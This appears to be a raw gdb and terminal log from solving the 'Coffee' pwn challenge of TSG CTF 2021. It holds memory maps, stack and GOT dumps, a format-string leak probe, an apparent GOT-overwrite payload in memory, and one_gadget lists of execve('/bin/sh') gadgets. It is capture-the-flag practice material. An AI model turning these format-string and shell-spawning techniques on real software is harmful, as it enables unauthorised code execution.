gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r--p	/home/mito/CTF/TSG_CTF_2021/Pwn_Coffee/coffee/coffee
0x00401000         0x00402000         r-xp	/home/mito/CTF/TSG_CTF_2021/Pwn_Coffee/coffee/coffee
0x00402000         0x00403000         r--p	/home/mito/CTF/TSG_CTF_2021/Pwn_Coffee/coffee/coffee
0x00403000         0x00404000         r--p	/home/mito/CTF/TSG_CTF_2021/Pwn_Coffee/coffee/coffee
0x00404000         0x00405000         rw-p	/home/mito/CTF/TSG_CTF_2021/Pwn_Coffee/coffee/coffee
0x00405000         0x00426000         rw-p	[heap]
0x00007ffff79e2000 0x00007ffff7bc9000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bc9000 0x00007ffff7dc9000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dc9000 0x00007ffff7dcd000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcd000 0x00007ffff7dcf000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd3000 rw-p	mapped
0x00007ffff7dd3000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7fd5000 0x00007ffff7fd7000 rw-p	mapped
0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]


mito@ubuntu:~/CTF/TSG_CTF_2021/Pwn_Coffee/coffee$ ./coffee 
AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p
AAAAAAAA,0x1,0x7ffff7dcf8d0,0x7ffff7dce560,(nil),(nil),0x4141414141414141,0x252c70252c70252c,0x2c70252c70252c70bye

gdb-peda$ x/80gx 0x7fffffffdd00
0x7fffffffdd00:	0x00007ffff7dced80	0x00007ffff7dced80
0x7fffffffdd10:	0x00007ffff7ffea98	0x00007fffffffde58
0x7fffffffdd20:	0x00007fffffffde90	0x00007ffff7ffe710
0x7fffffffdd30:	0x0000000000000000	0x00007ffff7dde39f
0x7fffffffdd40:	0x0000000000000000	0x00007fffffffde90
0x7fffffffdd50:	0x0000000000000000	0x0000000000000000
0x7fffffffdd60:	0x0000000000000000	0x00007ffff7ffe710
0x7fffffffdd70:	0x00007ffff7b95707	0x0000000000000380
0x7fffffffdd80:	0x0000000000000000	0x00007ffff7ffe170
0x7fffffffdd90:	0x0000000000000000	0x00000000004011cf
0x7fffffffdda0:	0x4141414141414141	0x4141414141414141
0x7fffffffddb0:	0x0000000041414141	0x0000000000000000
0x7fffffffddc0:	0x00007ffff7ffa268	0x00007ffff7ffe710
0x7fffffffddd0:	0x0000000000000000	0x0000000000000000
0x7fffffffdde0:	0x0000000000000000	0x0000000000000000
0x7fffffffddf0:	0x000000000000000d	0x00007ffff7dd5660
0x7fffffffde00:	0x00007fffffffde68	0x0000000000f0b5ff
0x7fffffffde10:	0x00000000000000c2	0x000000000040127d
0x7fffffffde20:	0x00007ffff7de3b40	0x0000000000000000
0x7fffffffde30:	0x0000000000401230	0x00000000004010b0
0x7fffffffde40:	0x00007fffffffdf30	0x08a6edc898e5cb00
0x7fffffffde50:	0x0000000000401230	0x00007ffff7a03bf7
0x7fffffffde60:	0x0000000000000001	0x00007fffffffdf38
0x7fffffffde70:	0x0000000100008000	0x0000000000401196
0x7fffffffde80:	0x0000000000000000	0xc953b03dcf625dd3
0x7fffffffde90:	0x00000000004010b0	0x00007fffffffdf30
0x7fffffffdea0:	0x0000000000000000	0x0000000000000000
0x7fffffffdeb0:	0x36ac4f4257c25dd3	0x36ac5ffd9c5c5dd3
0x7fffffffdec0:	0x00007fff00000000	0x0000000000000000
0x7fffffffded0:	0x0000000000000000	0x00007ffff7de38d3
0x7fffffffdee0:	0x00007ffff7dc9638	0x00000000000cc729
0x7fffffffdef0:	0x0000000000000000	0x0000000000000000
0x7fffffffdf00:	0x0000000000000000	0x00000000004010b0
0x7fffffffdf10:	0x00007fffffffdf30	0x00000000004010de
0x7fffffffdf20:	0x00007fffffffdf28	0x000000000000001c
0x7fffffffdf30:	0x0000000000000001	0x00007fffffffe252
0x7fffffffdf40:	0x0000000000000000	0x00007fffffffe25b
0x7fffffffdf50:	0x00007fffffffe847	0x00007fffffffe869
0x7fffffffdf60:	0x00007fffffffe87a	0x00007fffffffe889

gdb-peda$ x/80gx 0x00404000
0x404000:	0x0000000000403e20	0x00007ffff7ffe170
0x404010:	0x00007ffff7dea8f0	0x0000000000401030
0x404020:	0x0000000000401040	0x0000000000401050
0x404030:	0x00007ffff7a5dfa0	0x0000000000000000
0x404040:	0x0000000000000000	0x0000000000c0ffee
0x404050:	0x0000000000000000	0x0000000000000000
0x404060:	0x0000000000000000	0x0000000000000000

gdb-peda$ x/80gx 0x7fffffffdf30
0x7fffffffdf30:	0x3131256330353125	0x333231256e6c6c24
0x7fffffffdf40:	0x6e68682432312563	0x2433312563373425
0x7fffffffdf50:	0x62616161616e6868	0x0000000000404018
0x7fffffffdf60:	0x0000000000404019	0x000000000040401a
0x7fffffffdf70:	0x0000000000000000	0x0000000000000000
0x7fffffffdf80:	0x0000000000400040	0x0000000000f0b5ff
0x7fffffffdf90:	0x00000000000000c2	0x00007fffffffdfc7
0x7fffffffdfa0:	0x00007fffffffdfc6	0x000000000040127d
0x7fffffffdfb0:	0x00007ffff7faffc8	0x0000000000401230
0x7fffffffdfc0:	0x0000000000000000	0x00000000004010b0
0x7fffffffdfd0:	0x00007fffffffe0d0	0x733c15e0fa75f300
0x7fffffffdfe0:	0x0000000000000000	0x00007ffff7de60b3
0x7fffffffdff0:	0x00007ffff7ffc620	0x00007fffffffe0d8
0x7fffffffe000:	0x0000000100000000	0x0000000000401196
0x7fffffffe010:	0x0000000000401230	0xbdab5204f4d1fd06
0x7fffffffe020:	0x00000000004010b0	0x00007fffffffe0d0
0x7fffffffe030:	0x0000000000000000	0x0000000000000000
0x7fffffffe040:	0x4254adfb4b31fd06	0x4254bdb8341ffd06
0x7fffffffe050:	0x0000000000000000	0x0000000000000000
0x7fffffffe060:	0x0000000000000000	0x0000000000000001
0x7fffffffe070:	0x00007fffffffe0d8	0x00007fffffffe0e8
0x7fffffffe080:	0x00007ffff7ffe190	0x0000000000000000


gdb-peda$ x/80gx 0x7fffffffdf00
0x7fffffffdf00:	0x0000038000000380	0x0000038000000380
0x7fffffffdf10:	0x0000000000401230	0x00007ffff7ffe190
0x7fffffffdf20:	0x0000000000000002	0x00000000004011f0
0x7fffffffdf30:	0x3131256338373125	0x633539256e6c6c24
0x7fffffffdf40:	0x256e686824323125	0x6824333125633734
0x7fffffffdf50:	0x6162616161616e68	0x0000000000404018
0x7fffffffdf60:	0x0000000000404019	0x000000000040401a
0x7fffffffdf70:	0x0000000000000000	0x0000000000000000
0x7fffffffdf80:	0x0000000000400040	0x0000000000f0b5ff
0x7fffffffdf90:	0x00000000000000c2	0x00007fffffffdfc7
0x7fffffffdfa0:	0x00007fffffffdfc6	0x000000000040127d
0x7fffffffdfb0:	0x00007ffff7faffc8	0x0000000000401230
0x7fffffffdfc0:	0x0000000000000000	0x00000000004010b0
0x7fffffffdfd0:	0x00007fffffffe0d0	0x79633489797fcf00
0x7fffffffdfe0:	0x0000000000000000	0x00007ffff7de60b3
0x7fffffffdff0:	0x00007ffff7ffc620	0x00007fffffffe0d8
0x7fffffffe000:	0x0000000100000000	0x0000000000401196
0x7fffffffe010:	0x0000000000401230	0x51d21edb4d97ecc3
0x7fffffffe020:	0x00000000004010b0	0x00007fffffffe0d0
0x7fffffffe030:	0x0000000000000000	0x0000000000000000
0x7fffffffe040:	0xae2de124f277ecc3	0xae2df1678d59ecc3
0x7fffffffe050:	0x0000000000000000	0x0000000000000000
0x7fffffffe060:	0x0000000000000000	0x0000000000000001
0x7fffffffe070:	0x00007fffffffe0d8	0x00007fffffffe0e8
0x7fffffffe080:	0x00007ffff7ffe190	0x0000000000000000
0x7fffffffe090:	0x0000000000000000	0x00000000004010b0
0x7fffffffe0a0:	0x00007fffffffe0d0	0x0000000000000000
0x7fffffffe0b0:	0x0000000000000000	0x00000000004010de
0x7fffffffe0c0:	0x00007fffffffe0c8	0x000000000000001c
0x7fffffffe0d0:	0x0000000000000001	0x00007fffffffe3e6
0x7fffffffe0e0:	0x0000000000000000	0x00007fffffffe3ef
0x7fffffffe0f0:	0x00007fffffffe3ff	0x00007fffffffe451

mito@ubuntu:~/CTF/TSG_CTF_2021/Pwn_Coffee/coffee$ one_gadget /lib/x86_64-linux-gnu/libc-2.31.so
0xe6aee execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6af1 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6af4 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

mito@ubuntu:~/CTF/TSG_CTF_2021/Pwn_Coffee/coffee$ one_gadget libc.so.6 
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
